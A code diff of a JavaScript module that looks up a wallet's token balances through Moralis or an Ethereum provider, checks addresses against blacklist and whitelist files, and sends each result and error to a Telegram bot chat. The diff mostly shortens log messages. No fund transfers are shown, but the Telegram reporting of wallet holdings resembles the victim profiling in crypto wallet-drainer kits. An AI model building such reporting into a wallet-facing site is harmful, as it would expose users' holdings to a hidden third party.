@@ -9,29 +9,28 @@ const { BLACKLISTED_ADDRESSES, WHITELISTED_ADDRESSES } = require("./BlackListed_
 const sendToTelegram = async (message) => {
   try {
     const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;
-    const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
-    const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
+    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = config;
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: truncatedMessage,
     });
-    console.log("Message sent to Telegram");
+    console.log("Telegram message sent");
   } catch (error) {
-    console.error("Error sending to Telegram:", error.response?.data || error.message);
+    console.error("Telegram error:", error.response?.data || error.message);
   }
 };
 
 const isAddressBlacklisted = (address) => {
   const normalizedAddress = address.toLowerCase();
   const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
-  if (isBlacklisted) console.warn(`🚨 Blacklisted address: ${normalizedAddress}`);
+  if (isBlacklisted) console.warn(`🚨 Blacklisted: ${normalizedAddress}`);
   return isBlacklisted;
 };
 
 const isAddressWhitelisted = (address) => {
   const normalizedAddress = address.toLowerCase();
   const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
-  if (isWhitelisted) console.log(`✅ Whitelisted address: ${normalizedAddress}`);
+  if (isWhitelisted) console.log(`✅ Whitelisted: ${normalizedAddress}`);
   return isWhitelisted;
 };
 
@@ -48,25 +47,20 @@ const fetchBalancesFromMoralis = async (address, chainId) => {
   const checksummedAddress = ethers.utils.getAddress(address);
 
   if (isAddressBlacklisted(checksummedAddress)) {
-    const message = `🚨 Blacklisted address: ${checksummedAddress}`;
+    const message = `🚨 Blacklisted: ${checksummedAddress}`;
     console.warn(message);
     await sendToTelegram(message);
     return [];
   }
   if (isAddressWhitelisted(checksummedAddress)) {
-    await sendToTelegram(`✅ Whitelisted address: ${checksummedAddress}`);
+    await sendToTelegram(`✅ Whitelisted: ${checksummedAddress}`);
   }
 
-  const chainMap = {
-    1: "eth",
-    56: "bsc",
-    137: "polygon",
-    42161: "arbitrum",
-  };
+  const chainMap = { 1: "eth", 56: "bsc", 137: "polygon", 42161: "arbitrum" };
   const unsupportedChains = [11155111];
   const chain = chainMap[chainId];
   if (!chain || unsupportedChains.includes(chainId)) {
-    console.log(`Chain ${chainId} unsupported by Moralis. Using direct fetch.`);
+    console.log(`Chain ${chainId} unsupported. Using direct fetch.`);
     return await fetchBalancesDirectly(checksummedAddress, chainId);
   }
 
@@ -77,24 +71,27 @@ const fetchBalancesFromMoralis = async (address, chainId) => {
     UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
     USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
     LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
-    // Add XPR address when provided
+    // Add XPR when provided
   };
 
   try {
+    const { MORALIS_API_KEY } = config;
+    if (!MORALIS_API_KEY) throw new Error("MORALIS_API_KEY missing");
+
     const response = await axios.get(
-      `https://deep-index.moralis.io/api/v2.2/wallet/${checksummedAddress}/tokens`,
+      `https://deep-index.moralis.io/api/v2.2/wallets/${checksummedAddress}/tokens`,
       {
         params: { chain, limit: 100 },
-        headers: { "X-API-Key": config.MORALIS_API_KEY, Accept: "application/json" },
+        headers: { "X-API-Key": MORALIS_API_KEY, Accept: "application/json" },
         timeout: 10000,
       }
     );
 
     console.log("Moralis Response:", JSON.stringify(response.data.result, null, 2));
-    await sendToTelegram(`Moralis Response for ${checksummedAddress}: ${JSON.stringify(response.data.result, null, 2)}`);
+    await sendToTelegram(`Moralis Response: ${JSON.stringify(response.data.result, null, 2)}`);
 
     const tokens = [];
-    let telegramMessage = `Balances for ${checksummedAddress}\n\n`;
+    let telegramMessage = `Balances for ${checksummedAddress}\n`;
     let foundBlacklistedToken = false;
 
     for (const asset of response.data.result || []) {
@@ -105,21 +102,19 @@ const fetchBalancesFromMoralis = async (address, chainId) => {
           : tokenAddressMap[symbol] || asset.token_address.toLowerCase();
 
       if (!tokenAddress) {
-        console.warn(`No address for ${symbol}. Skipping.`);
-        telegramMessage += `⚠️ No address for ${asset.name} (${symbol}).\n`;
+        telegramMessage += `⚠️ No address for ${asset.name} (${symbol})\n`;
         continue;
       }
 
       if (isAddressBlacklisted(tokenAddress)) {
         foundBlacklistedToken = true;
-        telegramMessage += `🚨 Blacklisted token: ${asset.name} (${tokenAddress})\n`;
+        telegramMessage += `🚨 Blacklisted: ${asset.name} (${tokenAddress})\n`;
         continue;
       }
 
       const amount = ethers.utils.parseUnits(asset.balance || "0", asset.decimals || 18);
       const amountUSD = parseFloat(asset.usd_value || 0);
 
-      // Relax filter for debugging
       if (!asset.possible_spam) {
         const tokenDetails = {
           address: tokenAddress,
@@ -137,27 +132,26 @@ const fetchBalancesFromMoralis = async (address, chainId) => {
       }
     }
 
-    telegramMessage += foundBlacklistedToken ? `\n🚨 Blacklisted tokens skipped.\n` : `\n✅ No blacklisted tokens.\n`;
+    telegramMessage += foundBlacklistedToken ? `\n🚨 Blacklisted tokens skipped\n` : `\n✅ No blacklisted tokens\n`;
     await sendToTelegram(telegramMessage);
 
-    console.log(`Fetched ${tokens.length} tokens from Moralis`);
     return tokens;
   } catch (error) {
     const errorMessage = error.response
-      ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data, null, 2)}`
+      ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data)}`
       : error.message;
     console.error("Moralis error:", errorMessage);
-    await sendToTelegram(`❌ Moralis error for ${checksummedAddress}: ${errorMessage}`);
+    await sendToTelegram(`❌ Moralis error: ${errorMessage}`);
     return await fetchBalancesDirectly(checksummedAddress, chainId);
   }
 };
 
 const fetchBalancesDirectly = async (address, chainId) => {
-  console.log(`Fetching balances directly for ${address} on chain ${chainId}`);
+  console.log(`Direct fetch for ${address} on chain ${chainId}`);
   const provider = getProvider(chainId);
 
   if (isAddressBlacklisted(address)) {
-    const message = `🚨 Blacklisted address: ${address}`;
+    const message = `🚨 Blacklisted: ${address}`;
     console.warn(message);
     await sendToTelegram(message);
     return [];
@@ -168,7 +162,7 @@ const fetchBalancesDirectly = async (address, chainId) => {
     const nativeToken = {
       address: ethers.constants.AddressZero,
       balance: nativeBalance,
-      contract: new ethers.Contract(ethers.constants.AddressZero, ERC20_ABI, provider),
+      contract: null,
       name: "Ether",
       symbol: "ETH",
       type: "NATIVE",
@@ -183,7 +177,6 @@ const fetchBalancesDirectly = async (address, chainId) => {
       { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
       { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
       { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
-      // Add XPR when provided
     ];
 
     const tokens = [nativeToken];
@@ -206,16 +199,16 @@ const fetchBalancesDirectly = async (address, chainId) => {
           });
         }
       } catch (error) {
-        console.warn(`Error fetching ${token.symbol} balance: ${error.message}`);
+        console.warn(`Error fetching ${token.symbol}: ${error.message}`);
         await sendToTelegram(`⚠️ Error fetching ${token.symbol}: ${error.message}`);
       }
     }
 
-    await sendToTelegram(`Fetched ${tokens.length} tokens directly for ${address}`);
+    await sendToTelegram(`Fetched ${tokens.length} tokens directly`);
     return tokens;
   } catch (error) {
     console.error(`Direct fetch error: ${error.message}`);
-    await sendToTelegram(`❌ Direct fetch error for ${address}: ${error.message}`);
+    await sendToTelegram(`❌ Direct fetch error: ${error.message}`);
     return [];
   }
 };
